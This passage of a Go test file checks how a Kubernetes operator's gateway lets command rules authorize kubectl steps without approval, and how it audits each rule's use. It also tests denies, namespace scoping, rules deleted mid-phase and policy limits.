package gateway

import (
	"context"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"maps"
	"reflect"
	"slices"
	"strings"
	"sync/atomic"
	"testing"

	"google.golang.org/grpc/codes"
	"google.golang.org/grpc/status"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/interceptor"

	lastv1alpha1 "github.com/moogie-labs/last-operator/api/v1alpha1"
	"github.com/moogie-labs/last-operator/internal/audit"
	"github.com/moogie-labs/last-operator/internal/gatewayapi/gatewayv1"
	"github.com/moogie-labs/last-operator/internal/plan"
	"github.com/moogie-labs/last-operator/internal/policy"
	"github.com/moogie-labs/last-operator/internal/rules"
)

const (
	ruleGetNS      = "get-ns"
	ruleGetDeploy  = "get-deploy"
	ruleGeneration = 3
	apkBin         = "apk"
)

var create = []lastv1alpha1.Stage{lastv1alpha1.StageCreate}

// ruleSteps is a plan of three kubectl reads with provider "cluster" and no
// references between them.
func ruleSteps() []lastv1alpha1.Command {
	steps := []lastv1alpha1.Command{
		argvStep("s1", kubectlBin, "get", "ns", envNS, "-o", "json"),
		argvStep("s2", kubectlBin, "get", "deployment", "web", "-n", envNS),
		argvStep("s3", kubectlBin, "get", "ns", "kube-system", "-o", "json"),
	}
	for i := range steps {
		steps[i].Providers = []string{testProvider}
	}
	return steps
}

func ruleSpec(stages []lastv1alpha1.Stage, argv ...string) lastv1alpha1.CommandRuleSpec {
	return lastv1alpha1.CommandRuleSpec{Stages: stages, Providers: []string{testProvider}, Match: lastv1alpha1.ArgvPattern{Argv: argv}}
}

// nsSpec covers s1 and s3; deploySpec covers s2; allSpec covers every ruleStep.
func nsSpec() lastv1alpha1.CommandRuleSpec {
	return ruleSpec(create, kubectlBin, "get", "ns", "*", "-o", "json")
}

func deploySpec() lastv1alpha1.CommandRuleSpec {
	return ruleSpec(create, kubectlBin, "get", "deployment", "*", "-n", envNS)
}

func allSpec() lastv1alpha1.CommandRuleSpec {
	return ruleSpec(create, kubectlBin, "get", "...")
}

// addRule creates a CommandRule in ns, or a ClusterCommandRule when ns is "".
func (e *testEnv) addRule(name, ns string, spec lastv1alpha1.CommandRuleSpec) {
	e.t.Helper()
	meta := metav1.ObjectMeta{Name: name, Namespace: ns, UID: types.UID("rule-uid-" + ns + "-" + name), Generation: ruleGeneration}
	var obj client.Object = &lastv1alpha1.CommandRule{ObjectMeta: meta, Spec: spec}
	if ns == "" {
		obj = &lastv1alpha1.ClusterCommandRule{ObjectMeta: meta, Spec: spec}
	}
	if err := e.crd.Create(e.ctx, obj); err != nil {
		e.t.Fatal(err)
	}
}

// deleteRule deletes the CommandRule in ns, or the ClusterCommandRule when ns is "".
func (e *testEnv) deleteRule(name, ns string) {
	e.t.Helper()
	meta := metav1.ObjectMeta{Name: name, Namespace: ns}
	var obj client.Object = &lastv1alpha1.CommandRule{ObjectMeta: meta}
	if ns == "" {
		obj = &lastv1alpha1.ClusterCommandRule{ObjectMeta: meta}
	}
	if err := e.crd.Delete(e.ctx, obj); err != nil {
		e.t.Fatal(err)
	}
}

func clusterRef(name string) string { return "cluster/-/" + name }
func nsRef(name string) string      { return "namespace/" + envNS + "/" + name }

// newRuleEnv is a provider env (Manual by default) holding an Intent with the plan of steps.
func newRuleEnv(t *testing.T, steps []lastv1alpha1.Command) (*testEnv, string) {
	t.Helper()
	in := intentWithPlan(t, steps)
	return newProviderEnv(t, in), in.Status.Plan.Hash
}

// ruleBegin asserts the only phase.begin written from index from on is
// authorized by rules, with the per-step map want, that the record's open phase
// and the in-memory phase say the same, that rule.observed was written for
// observed (ref strings, in order) and that no approval.observed was written.
func (e *testEnv) ruleBegin(from int, want map[string]string, observed ...string) {
	e.t.Helper()
	begin := e.phaseBeginAfter(from, false)
	e.wantAuth(begin, authRule, "")
	var pb phaseBegin
	if err := json.Unmarshal(begin.Payload, &pb); err != nil {
		e.t.Fatal(err)
	}
	if !maps.Equal(pb.Rules, want) {
		e.t.Fatalf("phase.begin rules = %v, want %v", pb.Rules, want)
	}
	if got := e.ruleObservedAfter(from); !slices.Equal(got, observed) {
		e.t.Fatalf("rule.observed for %v, want %v", got, observed)
	}
	p := e.g.phases.get(envKey)
	got := map[string]string{}
	for id, r := range p.rules {
		got[id] = r.String()
	}
	if !maps.Equal(got, want) {
		e.t.Fatalf("in-memory phase rules = %v, want %v", got, want)
	}
}

// ruleObservedAfter returns the refs of the rule.observed entries written from index from on.
func (e *testEnv) ruleObservedAfter(from int) []string {
	e.t.Helper()
	var out []string
	for _, en := range e.entries()[from:] {
		if en.Type == audit.TypeRuleObserved {
			var ro ruleObserved
			if err := json.Unmarshal(en.Payload, &ro); err != nil {
				e.t.Fatal(err)
			}
			out = append(out, rules.Ref{Scope: ro.Scope, Namespace: ro.Namespace, Name: ro.Name}.String())
		}
	}
	return out
}

// commandStamps returns the authorization of each command.start written from index from on.
func (e *testEnv) commandStamps(from int) []audit.Authorization {
	e.t.Helper()
	var out []audit.Authorization
	for _, en := range e.entries()[from:] {
		if en.Type == audit.TypeCommandStart {
			if en.AuthorizedBy == nil {
				e.t.Fatal("command.start without authorizedBy")
			}
			out = append(out, *en.AuthorizedBy)
		}
	}
	return out
}

// jsonObject decodes a JSON object, so payloads compare by their exact field names.
func jsonObject(t *testing.T, s string) map[string]any {
	t.Helper()
	var m map[string]any
	if err := json.Unmarshal([]byte(s), &m); err != nil {
		t.Fatal(err)
	}
	return m
}

func jsonValue(t *testing.T, b []byte) any {
	t.Helper()
	var v any
	if err := json.Unmarshal(b, &v); err != nil {
		t.Fatal(err)
	}
	return v
}

func ruleAuthOf(ref string) audit.Authorization {
	return audit.Authorization{Kind: authRule, Name: ref}
}

func wantStamps(t *testing.T, got []audit.Authorization, want ...audit.Authorization) {
	t.Helper()
	if !slices.Equal(got, want) {
		t.Fatalf("command.start stamps = %+v, want %+v", got, want)
	}
}

func TestCoveredPlanRunsWithoutApproval(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule(ruleGetNS, "", nsSpec())
	env.addRule(ruleGetDeploy, envNS, deploySpec())
	before := len(env.entries())
	if resp, err := env.begin(h); err != nil || resp.GetSteps() != 3 {
		t.Fatalf("BeginPhase = %v, %v", resp, err)
	}
	env.ruleBegin(before, map[string]string{"s1": clusterRef(ruleGetNS), "s2": nsRef(ruleGetDeploy), "s3": clusterRef(ruleGetNS)},
		clusterRef(ruleGetNS), nsRef(ruleGetDeploy))

	// Each rule.observed names the rule object it saw.
	var cluster lastv1alpha1.ClusterCommandRule
	if err := env.crd.Get(env.ctx, client.ObjectKey{Name: ruleGetNS}, &cluster); err != nil {
		t.Fatal(err)
	}
	var ns lastv1alpha1.CommandRule
	if err := env.crd.Get(env.ctx, client.ObjectKey{Namespace: envNS, Name: ruleGetDeploy}, &ns); err != nil {
		t.Fatal(err)
	}
	var payloads []map[string]any
	for _, en := range env.entries()[before:] {
		if en.Type == audit.TypeRuleObserved {
			if en.Intent != envKey || en.Stage != string(lastv1alpha1.StageCreate) || en.SubjectHash != h || en.Actor != testOperator {
				t.Fatalf("rule.observed = %+v", en)
			}
			payloads = append(payloads, jsonObject(t, string(en.Payload)))
		}
	}
	const observedJSON = `{"scope":%q,"namespace":%q,"name":%q,"uid":%q,"resourceVersion":%q,"generation":%d}`
	want := []map[string]any{
		jsonObject(t, fmt.Sprintf(observedJSON, "cluster", "", ruleGetNS, cluster.UID, cluster.ResourceVersion, cluster.Generation)),
		jsonObject(t, fmt.Sprintf(observedJSON, "namespace", envNS, ruleGetDeploy, ns.UID, ns.ResourceVersion, ns.Generation)),
	}
	specs := []lastv1alpha1.CommandRuleSpec{cluster.Spec, ns.Spec}
	if len(payloads) != 2 {
		t.Fatalf("rule.observed payloads = %v, want 2", payloads)
	}
	// Each rule.observed also carries the rule's spec and its hash, so an auditor
	// can tell what the rule allowed (I4).
	for i, p := range payloads {
		spec, hash := p["spec"], p["specHash"]
		delete(p, "spec")
		delete(p, "specHash")
		if !maps.Equal(p, want[i]) {
			t.Fatalf("rule.observed payload %d = %v, want %v", i, p, want[i])
		}
		c, err := audit.Canonical(specs[i])
		if err != nil {
			t.Fatal(err)
		}
		if !reflect.DeepEqual(spec, jsonValue(t, c)) {
			t.Errorf("rule.observed %d spec = %v, want %s", i, spec, c)
		}
		sum := sha256.Sum256(c)
		if want := "sha256:" + hex.EncodeToString(sum[:]); hash != want {
			t.Errorf("rule.observed %d specHash = %v, want %s", i, hash, want)
		}
		if again, err := audit.Canonical(spec); err != nil || sha256.Sum256(again) != sum {
			t.Errorf("rule.observed %d specHash is not the hash of its own spec (%v)", i, err)
		}
	}
	if cluster.UID == "" || cluster.ResourceVersion == "" || cluster.Generation != ruleGeneration {
		t.Fatalf("rule object = %+v", cluster.ObjectMeta)
	}

	before = len(env.entries())
	for _, s := range ruleSteps() {
		if _, err := env.run(h, s); err != nil {
			t.Fatalf("RunCommand(%s) = %v", s.ID, err)
		}
	}
	if _, err := env.end(h, true); err != nil {
		t.Fatalf("EndPhase = %v", err)
	}
	wantStamps(t, env.commandStamps(before), ruleAuthOf(clusterRef(ruleGetNS)), ruleAuthOf(nsRef(ruleGetDeploy)),
		ruleAuthOf(clusterRef(ruleGetNS)))
	if n := env.countType(before, audit.TypeApprovalObserved) + env.countType(before, audit.TypeRuleObserved); n != 0 {
		t.Fatalf("observed entries while the rules stood = %d, want 0", n)
	}
	if a := env.last().AuthorizedBy; env.last().Type != audit.TypePhaseEnd || a == nil || *a != (audit.Authorization{Kind: authRule}) {
		t.Fatalf("last entry = %s %+v, want phase.end {rule}", env.last().Type, a)
	}
	if got := env.executed(); got.PlanHash != h {
		t.Fatalf("executed = %+v, want %s", got, h)
	}
}

func TestPartlyCoveredPlanNeedsApproval(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule(ruleGetNS, "", nsSpec()) // s2 is uncovered
	before := len(env.entries())
	_, err := env.begin(h)
	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
	if !gatewayv1.NoApproval(err) {
		t.Fatalf("NoApproval(%v) = false", err)
	}

	env.approve(approvalFor("ok", h, lastv1alpha1.DecisionApprove, approver))
	before = len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatalf("BeginPhase(approved) = %v", err)
	}
	env.wantAuth(env.phaseBeginAfter(before, true), authApproval, envNS+"/ok")
	if got := env.ruleObservedAfter(before); got != nil {
		t.Fatalf("rule.observed for %v in an approved phase", got)
	}
	var pb phaseBegin
	if err := json.Unmarshal(env.phaseBeginAfter(before, true).Payload, &pb); err != nil || pb.Rules != nil {
		t.Fatalf("phase.begin rules = %v, %v; want none", pb.Rules, err)
	}
}

func TestPartlyCoveredAutoRemediateNeedsApproval(t *testing.T) {
	env, _ := executedEnv(t)
	env.setDefaultModes(lastv1alpha1.ModeAuto)
	restart := argvStep("restart", kubectlBin, "rollout", "restart", "deployment/web", "-n", envNS)
	h := env.recordPlan(lastv1alpha1.StageRemediate, plan.Body{Steps: append(repairSteps(), restart),
		Resources: executedResources(), Nonce: nonce1})
	env.addRule("restart", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageRemediate}, restart.Run.Argv...))
	before := len(env.entries())
	_, err := env.beginStage(lastv1alpha1.StageRemediate, h)
	env.wantNeedsApproval(err, before)
}

func TestADenyBeatsARule(t *testing.T) {
	t.Run("at BeginPhase", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", "", allSpec())
		env.approve(approvalFor("no", h, lastv1alpha1.DecisionDeny, "bob"))
		before := len(env.entries())
		_, err := env.begin(h)
		env.refusedWith(err, codes.PermissionDenied, "approval no denies this plan", before)
		wantDeniedByApproval(t, err)
		if got := env.ruleObservedAfter(before); got != nil {
			t.Fatalf("rule.observed for %v before a refusal", got)
		}
	})
	t.Run("at RunCommand", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", "", allSpec())
		if _, err := env.begin(h); err != nil {
			t.Fatal(err)
		}
		if _, err := env.run(h, ruleSteps()[0]); err != nil {
			t.Fatal(err)
		}
		env.approve(approvalFor("no", h, lastv1alpha1.DecisionDeny, "bob"))
		before := len(env.entries())
		_, err := env.run(h, ruleSteps()[1])
		env.wantDenied(err, codes.PermissionDenied)
		if !strings.Contains(err.Error(), "rule authorization withdrawn: no denies this plan") {
			t.Fatalf("RunCommand = %v, want the Deny named", err)
		}
		wantDeniedByApproval(t, err)
		wantNoCommandStart(t, env, before)
		_, err = env.end(h, true)
		env.wantDenied(err, codes.FailedPrecondition)
	})
}

func TestAutoWithinLimitsStillAuthorizesAsAuto(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.setDefaultModes(lastv1alpha1.ModeAuto)
	env.addRule("all", "", allSpec())
	env.approve(approvalFor("ok", h, lastv1alpha1.DecisionApprove, approver))
	before := len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatalf("BeginPhase = %v", err)
	}
	env.wantAuth(env.phaseBeginAfter(before, false), authAuto, string(policy.KeyCreate))
	if got := env.ruleObservedAfter(before); got != nil {
		t.Fatalf("rule.observed for %v in an Auto phase", got)
	}
}

func TestARuleAuthorizesBeforeAnApprove(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule("all", "", allSpec())
	env.approve(approvalFor("ok", h, lastv1alpha1.DecisionApprove, approver))
	before := len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatalf("BeginPhase = %v", err)
	}
	env.ruleBegin(before, map[string]string{"s1": clusterRef("all"), "s2": clusterRef("all"), "s3": clusterRef("all")}, clusterRef("all"))
}

func TestARuleCoversARemediateOutsideD9(t *testing.T) {
	restart := argvStep("restart", kubectlBin, "rollout", "restart", "deployment/web", "-n", envNS)
	steps := append(repairSteps(), restart)
	remediate := []lastv1alpha1.Stage{lastv1alpha1.StageRemediate}
	for _, mode := range []lastv1alpha1.Mode{lastv1alpha1.ModeManual, lastv1alpha1.ModeAuto} {
		t.Run(string(mode), func(t *testing.T) {
			env, _ := executedEnv(t)
			env.setDefaultModes(mode)
			env.addRule("apply", envNS, ruleSpec(remediate, kubectlBin, "apply", "-f", "/work/web.yaml"))
			env.addRule("restart", envNS, ruleSpec(remediate, restart.Run.Argv...))
			h := env.recordPlan(lastv1alpha1.StageRemediate, plan.Body{Steps: steps, Resources: executedResources(), Nonce: nonce1})
			before := len(env.entries())
			if _, err := env.beginStage(lastv1alpha1.StageRemediate, h); err != nil {
				t.Fatalf("BeginPhase(Remediate) = %v", err)
			}
			env.ruleBegin(before, map[string]string{"fix": nsRef("apply"), "restart": nsRef("restart")}, nsRef("apply"), nsRef("restart"))
			before = len(env.entries())
			for _, s := range steps {
				if _, err := env.run(h, s); err != nil {
					t.Fatalf("RunCommand(%s) = %v", s.ID, err)
				}
			}
			if _, err := env.end(h, true); err != nil {
				t.Fatalf("EndPhase = %v", err)
			}
			wantStamps(t, env.commandStamps(before), ruleAuthOf(nsRef("apply")), ruleAuthOf(nsRef("restart")))
		})
	}
}

func TestARuleCoversADeleteWithNoExecutedPlan(t *testing.T) {
	// With no executed plan a Delete is outside D9's limits even in Auto.
	in := intentWithPlan(t, ruleSteps())
	env := newProviderEnv(t, in)
	env.setDefaultModes(lastv1alpha1.ModeAuto)
	h := env.startDelete(teardownCommands())
	before := len(env.entries())
	_, err := env.beginStage(lastv1alpha1.StageDelete, h)
	env.wantNeedsApproval(err, before)

	env.addRule("teardown", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageDelete}, kubectlBin, "delete", "..."))
	before = len(env.entries())
	if _, err := env.beginStage(lastv1alpha1.StageDelete, h); err != nil {
		t.Fatalf("BeginPhase(Delete) = %v", err)
	}
	env.ruleBegin(before, map[string]string{"t1": nsRef("teardown"), "t2": nsRef("teardown")}, nsRef("teardown"))
	for _, s := range teardownCommands() {
		if _, err := env.run(h, s); err != nil {
			t.Fatalf("RunCommand(%s) = %v", s.ID, err)
		}
	}
	if _, err := env.end(h, true); err != nil {
		t.Fatalf("EndPhase(Delete) = %v", err)
	}
}

func TestAClusterRuleCoversEveryNamespaceAndANamespaceRuleOnlyItsOwn(t *testing.T) {
	t.Run("a namespace rule in another namespace covers nothing", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", tokOther, allSpec())
		before := len(env.entries())
		_, err := env.begin(h)
		env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)
	})
	t.Run("a namespace rule covers its own namespace", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", envNS, allSpec())
		before := len(env.entries())
		if _, err := env.begin(h); err != nil {
			t.Fatalf("BeginPhase = %v", err)
		}
		env.ruleBegin(before, map[string]string{"s1": nsRef("all"), "s2": nsRef("all"), "s3": nsRef("all")}, nsRef("all"))
	})
	t.Run("a cluster rule covers every namespace, and comes first", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("a-local", envNS, allSpec())
		env.addRule("z-cluster", "", allSpec())
		env.addRule("y-cluster", "", allSpec())
		before := len(env.entries())
		if _, err := env.begin(h); err != nil {
			t.Fatalf("BeginPhase = %v", err)
		}
		env.ruleBegin(before, map[string]string{"s1": clusterRef("y-cluster"), "s2": clusterRef("y-cluster"), "s3": clusterRef("y-cluster")},
			clusterRef("y-cluster"))
	})
}

func TestAnUnmatchedInstallLeavesThePlanUncovered(t *testing.T) {
	jq := []string{apkBin, "add", "jq"}
	step := withInstall(ruleSteps()[0], install(jq))
	env, h := newRuleEnv(t, []lastv1alpha1.Command{step})
	spec := nsSpec()
	spec.Install = []lastv1alpha1.ArgvPattern{{Argv: []string{apkBin, "add", "curl"}}}
	env.addRule("argv-only", "", spec)
	before := len(env.entries())
	_, err := env.begin(h)
	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"plan", before)

	spec.Install = append(spec.Install, lastv1alpha1.ArgvPattern{Argv: jq})
	env.addRule("with-install", "", spec)
	before = len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatalf("BeginPhase = %v", err)
	}
	env.ruleBegin(before, map[string]string{"s1": clusterRef("with-install")}, clusterRef("with-install"))
}

func TestDeletingARuleMidPhaseNeedsAnApproval(t *testing.T) {
	open := func(t *testing.T) (*testEnv, string) {
		t.Helper()
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", envNS, allSpec())
		if _, err := env.begin(h); err != nil {
			t.Fatal(err)
		}
		before := len(env.entries())
		if _, err := env.run(h, ruleSteps()[0]); err != nil {
			t.Fatal(err)
		}
		wantStamps(t, env.commandStamps(before), ruleAuthOf(nsRef("all")))
		env.deleteRule("all", envNS)
		return env, h
	}
	t.Run("without an Approve the step is refused", func(t *testing.T) {
		env, h := open(t)
		before := len(env.entries())
		_, err := env.run(h, ruleSteps()[1])
		env.wantDenied(err, codes.PermissionDenied)
		if !strings.Contains(err.Error(), "rule authorization withdrawn: no rule covers step s2 and no IntentApproval approves this plan") {
			t.Fatalf("RunCommand = %v", err)
		}
		if gatewayv1.Denied(err) || gatewayv1.NeedsApproval(err) || gatewayv1.NoApproval(err) {
			t.Fatalf("refusal %v reads as a Deny or an approval wait", err)
		}
		wantNoCommandStart(t, env, before)
		if p := env.g.phases.get(envKey); p == nil || !p.failed {
			t.Fatal("the refusal did not fail the phase")
		}
		_, err = env.end(h, true)
		env.wantDenied(err, codes.FailedPrecondition)
	})
	t.Run("with an Approve the step runs as approved", func(t *testing.T) {
		env, h := open(t)
		env.approve(approvalFor("ok", h, lastv1alpha1.DecisionApprove, approver))
		before := len(env.entries())
		for _, s := range ruleSteps()[1:] {
			if _, err := env.run(h, s); err != nil {
				t.Fatalf("RunCommand(%s) = %v", s.ID, err)
			}
		}
		if _, err := env.end(h, true); err != nil {
			t.Fatal(err)
		}
		env.wantStepAudit(before, []string{"ok"}, authApproval, envNS+"/ok")
		if got := env.ruleObservedAfter(before); got != nil {
			t.Fatalf("rule.observed for %v after the rule was deleted", got)
		}
	})
	t.Run("an Approve from the operator is refused", func(t *testing.T) {
		env, h := open(t)
		env.approve(approvalFor("self", h, lastv1alpha1.DecisionApprove, testOperator))
		_, err := env.run(h, ruleSteps()[1])
		env.wantDenied(err, codes.PermissionDenied)
		if !strings.Contains(err.Error(), "names the operator as approver") {
			t.Fatalf("RunCommand = %v", err)
		}
		if p := env.g.phases.get(envKey); p == nil || !p.failed {
			t.Fatal("the refusal did not fail the phase")
		}
	})
}

func TestARecheckPassesThroughAnotherCoveringRule(t *testing.T) {
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule("a-all", envNS, allSpec())
	env.addRule("b-all", envNS, allSpec())
	before := len(env.entries())
	if _, err := env.begin(h); err != nil {
		t.Fatal(err)
	}
	env.ruleBegin(before, map[string]string{"s1": nsRef("a-all"), "s2": nsRef("a-all"), "s3": nsRef("a-all")}, nsRef("a-all"))
	before = len(env.entries())
	if _, err := env.run(h, ruleSteps()[0]); err != nil {
		t.Fatal(err)
	}
	env.deleteRule("a-all", envNS)
	for _, s := range ruleSteps()[1:] {
		if _, err := env.run(h, s); err != nil {
			t.Fatalf("RunCommand(%s) = %v", s.ID, err)
		}
	}
	p := env.g.phases.get(envKey)
	if _, err := env.end(h, true); err != nil {
		t.Fatal(err)
	}
	wantStamps(t, env.commandStamps(before), ruleAuthOf(nsRef("a-all")), ruleAuthOf(nsRef("b-all")), ruleAuthOf(nsRef("b-all")))
	if got := env.ruleObservedAfter(before); !slices.Equal(got, []string{nsRef("b-all")}) {
		t.Fatalf("rule.observed for %v, want b-all once", got)
	}
	if n := env.countType(before, audit.TypeApprovalObserved); n != 0 {
		t.Fatalf("approval.observed = %d, want 0", n)
	}
	got := map[string]string{}
	for id, r := range p.rules {
		got[id] = r.String()
	}
	if want := map[string]string{"s1": nsRef("a-all"), "s2": nsRef("b-all"), "s3": nsRef("b-all")}; !maps.Equal(got, want) {
		t.Fatalf("in-memory phase rules = %v, want %v", got, want)
	}
}

func TestARuleObservedAgainAfterAnApproveFallback(t *testing.T) {
	// A rule withdrawn, an Approve standing in, then a rule again: each switch is audited.
	env, h := newRuleEnv(t, ruleSteps())
	env.addRule("all", envNS, allSpec())
	if _, err := env.begin(h); err != nil {
		t.Fatal(err)
	}
	env.deleteRule("all", envNS)
	env.approve(approvalFor("ok", h, lastv1alpha1.DecisionApprove, approver))
	before := len(env.entries())
	if _, err := env.run(h, ruleSteps()[0]); err != nil {
		t.Fatal(err)
	}
	env.addRule("again", envNS, allSpec())
	for _, s := range ruleSteps()[1:] {
		if _, err := env.run(h, s); err != nil {
			t.Fatalf("RunCommand(%s) = %v", s.ID, err)
		}
	}
	wantStamps(t, env.commandStamps(before), audit.Authorization{Kind: authApproval, Name: envNS + "/ok"},
		ruleAuthOf(nsRef("again")), ruleAuthOf(nsRef("again")))
	if got := env.ruleObservedAfter(before); !slices.Equal(got, []string{nsRef("again")}) {
		t.Fatalf("rule.observed for %v, want again once", got)
	}
	if p := env.g.phases.get(envKey); p.auth == nil || *p.auth != (audit.Authorization{Kind: authRule}) {
		t.Fatalf("phase auth = %+v, want {rule}", p.auth)
	}
}

func TestACoveredDiscoveryCommandRuns(t *testing.T) {
	c := discoveryCommand()
	in := intentWithDiscovery(t, c, nonce1)
	h := in.Status.PendingCommand.Hash
	env := newProviderEnv(t, in)
	env.addRule("inspect", envNS, ruleSpec([]lastv1alpha1.Stage{lastv1alpha1.StageDiscovery}, c.Run.Argv...))
	before := len(env.entries())
	if _, err := env.beginStage(lastv1alpha1.StageDiscovery, h); err != nil {
		t.Fatalf("BeginPhase(Discovery) = %v", err)
	}
	env.ruleBegin(before, map[string]string{plan.DiscoveryStepID: nsRef("inspect")}, nsRef("inspect"))
	before = len(env.entries())
	if r, err := env.run(h, c); err != nil || r.GetResult().GetExitCode() != 0 {
		t.Fatalf("RunCommand(discovery) = %v, %v", r, err)
	}
	if _, err := env.end(h, true); err != nil {
		t.Fatalf("EndPhase = %v", err)
	}
	wantStamps(t, env.commandStamps(before), ruleAuthOf(nsRef("inspect")))
}

func TestARuleForAnotherStageCoversNothing(t *testing.T) {
	c := discoveryCommand()
	in := intentWithDiscovery(t, c, nonce1)
	env := newProviderEnv(t, in)
	env.addRule("inspect", envNS, ruleSpec(create, c.Run.Argv...))
	before := len(env.entries())
	_, err := env.beginStage(lastv1alpha1.StageDiscovery, in.Status.PendingCommand.Hash)
	env.refusedWith(err, codes.FailedPrecondition, gatewayv1.MsgNoApprovalPrefix+"discovery command", before)
}

func TestRulesNeverWidenPolicy(t *testing.T) {
	t.Run("at BeginPhase", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", "", allSpec())
		env.addPolicy("no-cluster", lastv1alpha1.IntentPolicySpec{Providers: []string{"aws"}})
		before := len(env.entries())
		_, err := env.begin(h)
		env.refusedWith(err, codes.PermissionDenied, `provider "cluster" is not allowed`, before)
		if got := env.ruleObservedAfter(before); got != nil {
			t.Fatalf("rule.observed for %v before a policy refusal", got)
		}
	})
	t.Run("at RunCommand", func(t *testing.T) {
		env, h := newRuleEnv(t, ruleSteps())
		env.addRule("all", "", allSpec())
		if _, err := env.begin(h); err != nil {
			t.Fatal(err)
		}
		env.addPolicy("no-cluster", lastv1alpha1.IntentPolicySpec{Providers: []string{"aws"}})
		before := len(env.entries())
		_, err := env.run(h, ruleSteps()[0])
		env.wantDenied(err, codes.PermissionDenied)
		if !strings.Contains(err.Error(), `provider "cluster" is not allowed`) {
			t.Fatalf("RunCommand = %v", err)
		}
		wantNoCommandStart(t, env, before)
	})
}

func TestAnEmptyPlanIsNeverRuleCovered(t *testing.T) {
	// plan.Validate refuses an empty plan before authorization; authorizePhase
	// must not cover one either.
	env, _ := newRuleEnv(t, ruleSteps())
	env.addRule("all", "", allSpec())
	var in lastv1alpha1.Intent
	if err := env.crd.Get(env.ctx, client.ObjectKey{Namespace: envNS, Name: envIntent}, &in); err != nil {
		t.Fatal(err)
	}
	_, layers, err := env.g.readPolicy(env.ctx, envNS)
	if err != nil || len(layers.rules) != 1 {
		t.Fatalf("readPolicy = %d rules, %v", len(layers.rules), err)
	}
	rec, err := env.g.state.Load(env.ctx, envKey, envIntentUID)
	if err != nil {
		t.Fatal(err)
	}
	d := denial{ctx: env.ctx, w: env.g.writer.Load(), actor: testOperator, intent: envKey, stage: string(lastv1alpha1.StageCreate),
		subject: in.Status.Plan.Hash, rpc: "BeginPhase"}
	auth, _, covered, err := env.g.authorizePhase(env.ctx, d, layers, rec, &in, lastv1alpha1.StageCreate, in.Status.Plan.Hash, plan.Body{})
	if status.Code(err) != codes.FailedPrecondition || auth != nil || covered != nil {
		t.Fatalf("authorizePhase(empty) = %+v, %v, %v; want the no-approval refusal", auth, covered, err)
	}
}

// failRuleLists makes the gateway's lists of kind (a rule list type) fail while fail is set.
func (e *testEnv) failRuleLists(fail *atomic.Bool, kind client.ObjectList) {
	e.g.crd = interceptor.NewClient(e.crd.(client.WithWatch), interceptor.Funcs{
		List: func(ctx context.Context, c client.WithWatch, list client.ObjectList, opts ...client.ListOption) error {
			if fail.Load() && sameType(list, kind) {
				return errors.New("api server unavailable")
			}
			return c.List(ctx, list, opts...)
		},
	})
}

func sameType(a, b client.ObjectList) bool {
	switch a.(type) {
	case *lastv1alpha1.CommandRuleList:
		_, ok := b.(*lastv1alpha1.CommandRuleList)
		return ok
	case *lastv1alpha1.ClusterCommandRuleList:
		_, ok := b.(*lastv1alpha1.ClusterCommandRuleList)
		return ok
	}
	return false
}

func TestARuleListErrorIsUnavailable(t *testing.T) {
	for name, kind := range map[string]client.ObjectList{
		"ClusterCommandRules": &lastv1alpha1.ClusterCommandRuleList{},
		"CommandRules":        &lastv1alpha1.CommandRuleList{},
	} {
		t.Run(name, func(t *testing.T) {
			env, h := newRuleEnv(t, ruleSteps())
			env.addRule("all", "", allSpec())
			env.approve(approvalFor("ok", h, lastv1alpha1.DecisionApprove, approver))
			var fail atomic.Bool
			fail.Store(true)
			env.failRuleLists(&fail, kind)
			before := len(env.entries())
			_, err := env.begin(h)
			if status.Code(err) != codes.Unavailable || !strings.Contains(err.Error(), "list "+name) {
				t.Fatalf("BeginPhase = %v, want Unavailable", err)
			}
			if n := env.countType(before, audit.TypePhaseBegin); n != 0 {
				t.Fatal("a phase opened while the rules could not be read")
			}

			// Mid-phase, a step is not run while the rules cannot be read.
			fail.Store(false)
			if _, err := env.begin(h); err != nil {
				t.Fatal(err)
			}
			fail.Store(true)
			before = len(env.entries())
			_, err = env.run(h, ruleSteps()[0])
			if status.Code(err) != codes.Unavailable {
				t.Fatalf("RunCommand = %v, want Unavailable", err)
			}
			wantNoCommandStart(t, env, before)
		})
	}
}

func TestAnInvalidRegexIsLoggedOncePerRuleVersion(t *testing.T) {
	env := newTestEnv(t)
	ref := func(name string) rules.Ref { return rules.Ref{Scope: "cluster", Name: name} }
	invalid := rules.Rule{Ref: ref("invalid"), Spec: ruleSpec(create, kubectlBin, "get", "re:(")}
	valid := rules.Rule{Ref: ref("valid"), Spec: allSpec()}
	v1 := ruleObject{uid: "u1", resourceVersion: "1"}
	if !env.g.warnInvalidRegex(invalid, v1) {
		t.Fatal("an invalid regex was not logged")
	}
	if env.g.warnInvalidRegex(invalid, v1) {
		t.Fatal("an invalid regex was logged twice for one resourceVersion")
	}
	if !env.g.warnInvalidRegex(invalid, ruleObject{uid: "u1", resourceVersion: "2"}) {
		t.Fatal("an invalid regex was not logged for a new resourceVersion")
	}
